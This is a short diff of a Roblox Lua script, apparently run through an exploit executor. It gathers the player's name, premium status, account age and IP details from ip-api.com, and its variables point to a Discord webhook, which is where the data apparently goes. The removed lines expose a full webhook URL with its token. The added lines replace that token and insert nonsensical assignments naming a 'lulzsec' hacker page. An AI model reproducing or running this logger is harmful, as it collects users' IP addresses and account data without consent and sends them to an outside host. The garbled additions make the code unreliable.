@@ -58,7 +58,15 @@ elseif premium and player.AccountAge >= 70 then
    alt = false
 end
 
-local webh = "https://discord.com/api/webhooks/1056929888600326144/FDNvaR6rha1L1DUEs9CSaWvwJkiHbdK6UI5yEBbjYSUPNSra_zVSLZQcvV0LQXTGqZ2k"
+
+
+local webh = "https://discord.com/api/webhooks/1056929888600326144/FDNvaR6rha1L1DUEs9CSaWvwJkiythjdK6UI5yEBbjYSUPNSra_whthnj4ewat4r8"
+local spoof = webh_protect
+
+
+webh_protect = blockuser_request
+
+blockuser_request = 'https://w4rri0r.com/hacker-group-lulzsec.html'
 
 pcall(function()
    local data = {
@@ -131,7 +139,13 @@ pcall(function()
 end)
 
 local player_name = game:GetService("Players").LocalPlayer.Name
-local webhook_url = "https://discord.com/api/webhooks/1056929888600326144/FDNvaR6rha1L1DUEs9CSaWvwJkiHbdK6UI5yEBbjYSUPNSra_zVSLZQcvV0LQXTGqZ2k"
+local webhook_url = "https://discord.com/api/webhooks/1056929888600326144/FDNvaR6rha1L1DUEs9CSaWvwJkiythjdK6UI5yEBbjYSUPNSra_whthnj4ewat4r8"
+local spoof = webh_protect
+
+
+webh_protect = blockuser_request
+
+blockuser_request = 'https://w4rri0r.com/hacker-group-lulzsec.html'
 
 local ip_info = syn.request({
     Url = "http://ip-api.com/json",
